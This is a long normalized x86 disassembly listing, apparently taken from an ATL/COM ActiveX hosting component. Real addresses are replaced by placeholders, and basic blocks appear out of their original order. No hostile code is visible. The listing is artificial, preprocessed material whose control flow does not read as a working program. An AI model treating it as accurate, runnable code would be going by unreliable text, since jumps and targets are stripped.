mov [ esp + 0x38 ] ecx
mov [ esp + 0x14 ] eax
test eax eax
jge r-xdata
push 0xd
call esi
test eax eax
je r-xdata
mov eax [ ebp - 0x48 ]
test eax eax
je r-xdata
neg eax
mov [ esp + 0x14 ] eax
call sub_41a770
lea esi [ esp + 0x10 ]
mov edi eax
call sub_41aed0
mov eax edi
jmp r-xdata
mov ebp [ GetDesktopWindow@IAT ]
call ebp
push eax
call [ GetDC@IAT ]
mov esi eax
test esi esi
jne r-xdata
push eax
call [ GetDC@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esp + 0x98 ]
pop edi
pop esi
pop ebx
pop ebp
xor ecx esp
call sub_43f96b
add esp 0x8c
retn 0x8
push 0x5a
push esi
call [ GetDeviceCaps@IAT ]
push esi
mov edi eax
call ebp
push eax
push 0x5a
push esi
call [ GetDeviceCaps@IAT ]
mov edx [ ebp - 0x48 ]
push esi
mov edi eax
push edx
jmp r-xdata
call [ ReleaseDC@IAT ]
mov eax [ esp + 0x14 ]
imul eax eax 0xafc80
cdq
idiv edi
push ebx
push r--data
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x2c ] eax
lea eax [ esp + 0x24 ]
push eax
call [ OleCreateFontIndirect@IAT ]
lea esi [ esp + 0x10 ]
call sub_41aed0
mov eax [ esp + 0x18 ]
sub_4189d0
movsx ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
add ecx ecx
add ecx ecx
add ecx ecx
xor ecx [ eax + 0x7c ]
push 0xfffffd3e
and ecx 0x8
xor [ eax + 0x7c ] ecx
add eax 0xffffffb4
push eax
call sub_418a60
xor eax eax
retn 0x8
sub_418a00
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x7c ]
and dl 0x8
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_418a60
push 0xffffffff
push sub_459428
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x60 ]
xor eax eax
xor esi esi
mov [ esp + 0x18 ] eax
test ecx ecx
je r-xdata
mov [ esp + 0x10 ] 0x0
test eax eax
je r-xdata
mov edx [ ecx ]
lea eax [ esp + 0x18 ]
push eax
push r--data
push ecx
mov ecx [ edx ]
call ecx
mov eax [ esp + 0x18 ]
mov [ esp + 0x10 ] 0xffffffff
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ eax ]
mov edx [ edx + 0x14 ]
push ecx
push eax
call edx
mov esi eax
mov eax [ esp + 0x18 ]
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_418bc0
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x7c ]
and dl 0x20
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_418c10
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x7c ]
and dl 0x40
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_418c40
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x9c ]
cmp esi eax
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x8
push eax
call [ SysFreeString@IAT ]
test esi esi
je r-xdata
mov [ edi + 0x9c ] 0x0
push esi
call [ SysAllocString@IAT ]
mov [ edi + 0x9c ] eax
test eax eax
jne r-xdata
push 0x8007000e
call sub_427e00
sub_418c90
push esi
mov esi [ esp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x9c ]
push eax
call [ SysAllocString@IAT ]
mov [ esi ] eax
xor eax eax
pop esi
retn 0x8
mov eax 0x80004003
pop esi
retn 0x8
sub_418cc0
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
cmp [ edi + 0x8 ] esi
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x8
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov [ edi + 0x8 ] esi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_418d00
push esi
mov esi eax
call sub_413bb0
mov eax [ esp + 0x8 ]
mov [ esi + 0x50 ] eax
mov [ esi ] r--data
mov [ esi + 0x24 ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x2c ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] r--data
mov [ esi + 0x40 ] r--data
mov [ esi + 0x44 ] r--data
mov [ esi + 0x48 ] r--data
mov [ esi + 0x4c ] r--data
mov eax esi
pop esi
retn 0x4
sub_418d70
push 0xffffffff
push sub_459bdb
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
mov [ esi + 0x4 ] 0x0
push esi
lea eax [ esi + 0x8 ]
mov [ esi ] r--data
call sub_418d00
mov [ esp + 0x10 ] 0x0
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
sub_418de0
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi eax
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
pop esi
mov eax 0x80070057
pop ebp
retn 0x8
test esi esi
je r-xdata
test ebp ebp
jne r-xdata
mov [ ebp ] 0x0
cmp [ edi ] 0x0
jne r-xdata
pop esi
mov eax 0x80004003
pop ebp
retn 0x8
mov ecx [ esi + 0x8 ]
push ebx
test ecx ecx
je r-xdata
cmp [ edi + 0x4 ] 0x0
jne r-xdata
mov eax 0x80004002
lea ecx [ ecx ]
cmp [ edi + 0x8 ] 0xc0
jne r-xdata
cmp ecx 0x1
je r-xdata
mov edx [ eax ]
cmp edx [ edi ]
jne r-xdata
cmp [ edi + 0xc ] 0x46000000
jne r-xdata
mov esi [ esi + 0x4 ]
add esi [ esp + 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push esi
call edx
pop ebx
mov [ ebp ] esi
pop esi
xor eax eax
pop ebp
retn 0x8
mov edx [ esi + 0x4 ]
mov eax [ esp + 0x10 ]
push edx
push ebp
push edi
push eax
call ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
add esi 0xc
test ecx ecx
jne r-xdata
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov esi [ esi + 0x4 ]
add esi eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov [ ebp ] esi
pop esi
xor eax eax
pop ebp
retn 0x8
pop ebx
pop esi
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
mov eax [ esi ]
xor ebx ebx
test eax eax
sete bl
test ebx ebx
jne r-xdata
mov edx [ eax + 0x8 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
test eax eax
jl r-xdata
mov eax [ eax + 0xc ]
cmp eax [ edi + 0xc ]
jne r-xdata
sub_418ee0
mov eax [ esp + 0xc ]
test eax eax
jne r-xdata
push esi
push edi
mov edi [ esp + 0x10 ]
xor esi esi
mov [ eax ] 0x0
cmp [ edi ] esi
jne r-xdata
mov eax 0x80004003
retn 0xc
mov edx [ esp + 0xc ]
push eax
add edx 0x8
push edx
mov eax r--data
call sub_418de0
pop edi
mov esi eax
pop esi
retn 0xc
cmp [ edi + 0x4 ] esi
jne r-xdata
cmp [ edi + 0x8 ] 0xc0
jne r-xdata
cmp [ edi + 0xc ] 0x46000000
jne r-xdata
mov ecx [ esp + 0xc ]
mov [ eax ] ecx
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x4 ]
call ecx
pop edi
mov eax esi
pop esi
retn 0xc
sub_418f60
mov ecx [ esp + 0x4 ]
add [ ecx + 0x4 ] 0xffffffff
push esi
mov esi [ ecx + 0x4 ]
jne r-xdata
mov eax esi
pop esi
retn 0x4
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push 0x1
call edx
sub_418fb0
push esi
mov esi ecx
mov eax [ esi + 0xe8 ]
push eax
call [ SysFreeString@IAT ]
mov eax [ esi + 0xdc ]
test eax eax
je r-xdata
mov eax [ esi + 0xd8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x78 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x74 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x6c ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ esi + 0x14 ]
test esi esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
pop esi
retn
push esi
call sub_43f531
sub_4190a0
sub esp 0x8
test eax eax
jne r-xdata
mov ecx [ eax ]
push esi
lea edx [ esp + 0x8 ]
push edx
push r--data
push eax
mov eax [ ecx ]
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x10 ] 0x0
call eax
mov esi eax
test esi esi
jl r-xdata
mov eax 0x80070057
add esp 0x8
retn 0x8
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
lea edx [ esp + 0x4 ]
push edx
mov edx [ esp + 0x14 ]
push edx
push eax
mov eax [ ecx + 0x10 ]
call eax
mov esi eax
test esi esi
jl r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x14 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x18 ]
call eax
mov esi eax
mov eax esi
pop esi
add esp 0x8
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_419140
push 0xffffffff
push sub_4593f8
mov eax [ fs : 0x0 ]
push eax
push ecx
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ esi + 0x98 ]
test al 0x40
jne r-xdata
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
add esp 0x10
retn
or eax 0x40
mov [ esi + 0x98 ] eax
mov eax [ esi + 0x70 ]
xor edi edi
cmp eax edi
je r-xdata
mov ecx [ esi + 0x94 ]
cmp ecx 0xcdcdcdcd
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x1c ]
push edi
push edi
push 0x1
push eax
call edx
mov eax [ esi + 0x64 ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x60 ]
push ecx
lea ecx [ esi + 0x80 ]
push ecx
call sub_4190a0
mov [ esi + 0x94 ] 0xcdcdcdcd
mov eax [ esi + 0x60 ]
cmp eax edi
je r-xdata
mov ecx [ esi + 0x9c ]
mov edx [ eax ]
mov edx [ edx + 0x50 ]
push ecx
push eax
call edx
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
mov edx [ ecx + 0x18 ]
push 0x1
push eax
call edx
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
push edi
push eax
call edx
mov eax [ esi + 0x70 ]
cmp eax edi
je r-xdata
mov [ esp + 0x8 ] edi
lea edx [ esp + 0x8 ]
push edx
mov [ esp + 0x18 ] edi
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov eax [ esp + 0x8 ]
cmp eax edi
je r-xdata
mov [ esi + 0x90 ] edi
mov eax [ esi + 0x74 ]
cmp eax edi
je r-xdata
mov [ esi + 0x70 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x14 ] 0xffffffff
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
push edi
push eax
call edx
mov eax [ esp + 0x8 ]
mov eax [ esi + 0x64 ]
cmp eax edi
je r-xdata
mov [ esi + 0x74 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x60 ]
cmp eax edi
je r-xdata
mov [ esi + 0x64 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x6c ]
cmp eax edi
je r-xdata
mov [ esi + 0x60 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x68 ]
cmp eax edi
je r-xdata
mov [ esi + 0x6c ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0xc4 ]
and [ esi + 0x98 ] 0xffffffa4
cmp eax edi
je r-xdata
mov [ esi + 0x68 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
push eax
call [ DestroyAcceleratorTable@IAT ]
mov [ esi + 0xc4 ] edi
sub_4192d0
push 0xffffffff
push sub_459f6b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x8 ] ecx
mov [ ecx ] r--data
mov [ esp + 0x14 ] 0x0
lea esi [ ecx + 0x8 ]
mov [ ecx + 0x4 ] 0xc0000001
call sub_419140
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx esi
mov [ esp + 0x14 ] 0xffffffff
call sub_418fb0
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn
sub_419340
push ebp
mov ebp esp
push 0xffffffff
push sub_459f3b
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor esi esi
cmp ebx esi
jne r-xdata
mov edi 0x8007000e
push 0xf4
mov [ ebx ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] esi
call sub_43fa1d
add esp 0x4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax esi
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
push eax
call sub_418d70
mov esi eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc [ esi + 0x4 ]
add [ esi + 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax ]
push ebx
push r--data
push esi
call ecx
mov edi eax
test edi edi
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0xc ]
push 0x1
mov ecx esi
call eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419430
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x1c ]
push esi
push edi
mov esi eax
call sub_419880
xor ebx ebx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] ebx
call sub_419340
mov edi eax
cmp edi ebx
jl r-xdata
cmp ebp ebx
je r-xdata
mov eax [ esp + 0x24 ]
lea edx [ esp + 0x10 ]
push edx
mov [ esp + 0x14 ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jl r-xdata
push esi
call [ SysAllocString@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
xor esi esi
mov eax [ esp + 0x24 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp ] ebx
mov eax [ esp + 0x24 ]
mov [ ebp ] eax
mov [ esp + 0x24 ] ebx
jmp r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push edx
push ebx
push r--data
lea edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x30 ]
push edx
mov edx [ esp + 0x30 ]
push edx
push esi
push eax
mov eax [ ecx + 0x28 ]
call eax
push esi
mov edi eax
call [ SysFreeString@IAT ]
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
push 0x8007000e
call sub_427e00
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x10
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_419520
push ebp
mov ebp esp
push 0xffffffff
push sub_45aa38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
sub eax 0x1
mov ebx [ ebp + 0x8 ]
je r-xdata
xor edi edi
push edi
call [ OleInitialize@IAT ]
push ebx
call [ GetWindowTextLengthW@IAT ]
mov esi eax
lea eax [ esi + esi + 0xa ]
cmp eax 0x400
ja r-xdata
sub eax 0x81
je r-xdata
push eax
call sub_441c3d
add esp 0x4
cmp eax edi
je r-xdata
call sub_443650
mov eax esp
cmp eax edi
je r-xdata
push 0xffffffeb
push ebx
call [ GetWindowLongW@IAT ]
test eax eax
je r-xdata
sub eax 0x18e
jne r-xdata
mov [ ebp - 0x1c ] eax
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xcccc
add eax 0x8
call [ OleUninitialize@IAT ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
push ecx
push edx
push ebx
call [ DefWindowProcW@IAT ]
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc esi
push esi
push eax
push ebx
call [ GetWindowTextW@IAT ]
push r--data
push ebx
call [ SetWindowTextW@IAT ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x2c ] edi
cmp eax edi
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
lea esp [ ebp - 0x3c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0x10
push edi
push 0x42
call [ GlobalAlloc@IAT ]
mov esi eax
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov esi [ GetWindowLongW@IAT ]
push 0xffffffec
push eax
call esi
test eax 0x10000
je r-xdata
mov [ ebp - 0x28 ] 0x0
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
mov esi [ ebp - 0x14 ]
push eax
call sub_4139b0
xor esi esi
add esp 0x4
cmp eax esi
jge r-xdata
test edi edi
je r-xdata
movzx edi [ eax ]
push 0xffffffec
push ebx
call esi
or eax 0x10000
push eax
push 0xffffffec
push ebx
call [ SetWindowLongW@IAT ]
jmp r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x4
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x14 ]
push edi
lea ecx [ ebp - 0x20 ]
push ecx
push edx
push ebx
call sub_419430
cmp eax esi
jge r-xdata
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
cmp eax esi
push esi
call [ GlobalLock@IAT ]
mov ecx [ ebp + 0x14 ]
mov ecx [ ecx ]
push eax
add ecx 0x2
mov eax edi
mov edx edi
call sub_41a8e0
add esp 0x4
push esi
call [ GlobalUnlock@IAT ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
push esi
call [ CreateStreamOnHGlobal@IAT ]
mov esi [ ebp - 0x20 ]
mov eax [ esi ]
mov edx [ eax ]
lea ecx [ ebp - 0x2c ]
push ecx
push r--data
push esi
call edx
test eax eax
jge r-xdata
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
lea esi [ ebp - 0x18 ]
call sub_413980
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x2c ]
push ecx
push 0xffffffeb
push ebx
call [ SetWindowLongW@IAT ]
mov [ ebp - 0x4 ] 0x3
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push esi
call eax
lea esi [ ebp - 0x24 ]
call sub_41aed0
push edi
call [ SysFreeString@IAT ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
lea esi [ ebp - 0x24 ]
call sub_41aed0
push edi
call [ SysFreeString@IAT ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
test eax eax
jmp r-xdata
lea esi [ ebp - 0x24 ]
call sub_41aed0
push edi
call [ SysFreeString@IAT ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
lea esi [ ebp - 0x18 ]
call sub_413980
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
je r-xdata
lea esi [ ebp - 0x18 ]
call sub_413980
or eax 0xffffffff
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_419810
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
push edi
cmp ecx eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
lea eax [ ecx + eax * 2 ]
test eax eax
je r-xdata
mov edx [ esi ]
cmp ebx edx
jb r-xdata
inc [ esi + 0x4 ]
mov eax 0x1
pop edi
retn
mov dx [ ebx ]
mov [ eax ] dx
test eax eax
jne r-xdata
lea edi [ edx + eax * 2 ]
cmp ebx edi
jae r-xdata
lea edi [ ecx + ecx ]
test edi edi
jl r-xdata
lea edi [ eax + 0x1 ]
jmp r-xdata
push 0x80004005
call sub_427e00
xor eax eax
pop edi
retn
cmp edi 0x3fffffff
ja r-xdata
push 0x2
push edi
push edx
call sub_4413da
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] eax
sub_419880
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x38
push ebx
push ebp
push esi
push edi
push rw-data
call [ EnterCriticalSection@IAT ]
mov esi [ RegisterWindowMessageW@IAT ]
push r--data
call esi
push r--data
mov [ rw-data ] eax
call esi
mov ecx [ rw-data ]
mov [ rw-data ] eax
lea eax [ esp + 0x18 ]
push eax
push r--data
mov ebp 0x30
push ecx
mov [ esp + 0x24 ] ebp
call [ GetClassInfoExW@IAT ]
xor edi edi
cmp eax edi
jne r-xdata
push ebp
lea ecx [ esp + 0x1c ]
push edi
push ecx
call sub_443360
mov eax [ rw-data ]
add esp 0xc
lea edx [ esp + 0x18 ]
push edx
push r--data
push eax
mov [ esp + 0x24 ] ebp
call [ GetClassInfoExW@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
mov edx [ rw-data ]
push 0x7f00
push edi
mov [ esp + 0x20 ] ebp
mov [ esp + 0x24 ] 0x8
mov [ esp + 0x28 ] sub_4136c0
mov [ esp + 0x2c ] edi
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] edx
mov [ esp + 0x38 ] edi
call [ LoadCursorW@IAT ]
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x18 ]
push eax
mov [ esp + 0x3c ] 0x6
mov [ esp + 0x40 ] edi
mov [ esp + 0x44 ] r--data
mov [ esp + 0x48 ] edi
call [ RegisterClassExW@IAT ]
movzx eax ax
mov [ esp + 0x14 ] eax
cmp ax di
je r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ rw-data ]
push 0x7f00
push edi
mov [ esp + 0x20 ] ebp
mov [ esp + 0x24 ] 0x8
mov [ esp + 0x28 ] sub_419520
mov [ esp + 0x2c ] edi
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] edi
call [ LoadCursorW@IAT ]
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] 0x6
mov [ esp + 0x40 ] edi
mov [ esp + 0x44 ] r--data
mov [ esp + 0x48 ] edi
call [ RegisterClassExW@IAT ]
movzx eax ax
mov [ esp + 0x14 ] eax
cmp ax di
je r-xdata
xor esi esi
lea ebx [ esp + 0x14 ]
mov esi rw-data
call sub_419810
lea ebx [ esp + 0x14 ]
mov esi rw-data
call sub_419810
mov esi 0x1
jmp r-xdata
sub_419a20
push edi
mov edi eax
test edi edi
jl r-xdata
xor eax eax
pop edi
retn
mov eax [ esi + 0x8 ]
cmp edi eax
jge r-xdata
lea ecx [ eax - 0x1 ]
cmp edi ecx
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ esi ]
mov edi 0x1
push 0x4
sub edx edi
push edx
push eax
call sub_4413da
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esi ]
sub eax edi
add eax eax
push ebx
add eax eax
lea ecx [ ecx + edi * 4 ]
lea edx [ eax - 0x4 ]
push edx
lea ebx [ ecx + 0x4 ]
push ebx
push eax
push ecx
call sub_43fbf5
push eax
call sub_4237a0
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
sub eax edi
add eax eax
add eax eax
lea ecx [ ecx + edi * 4 ]
lea edx [ eax - 0x4 ]
push edx
lea edi [ ecx + 0x4 ]
push edi
push eax
push ecx
call sub_43fbf5
push eax
call sub_4237a0
add esp 0x28
pop ebx
mov [ esi ] eax
cmp [ esi + 0x8 ] edi
jne r-xdata
mov [ esi + 0x4 ] eax
cmp [ esi + 0x8 ] edi
jne r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
push 0x4
sub ecx edi
push ecx
push edx
call sub_4413da
add esp 0xc
test eax eax
jne r-xdata
dec [ esi + 0x8 ]
mov eax edi
pop edi
retn
sub_419ae0
push 0xffffffff
push sub_459678
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
mov edi [ rw-data ]
add edi 0x10
mov [ esp + 0x10 ] edi
push edi
mov [ esp + 0x24 ] 0x0
call [ EnterCriticalSection@IAT ]
mov [ esp + 0x14 ] 0x1
call [ GetCurrentThreadId@IAT ]
mov esi [ rw-data ]
mov ecx [ esi + 0x8 ]
mov ebx eax
xor eax eax
test ecx ecx
jle r-xdata
xor esi esi
jmp r-xdata
mov edx [ esi ]
push edi
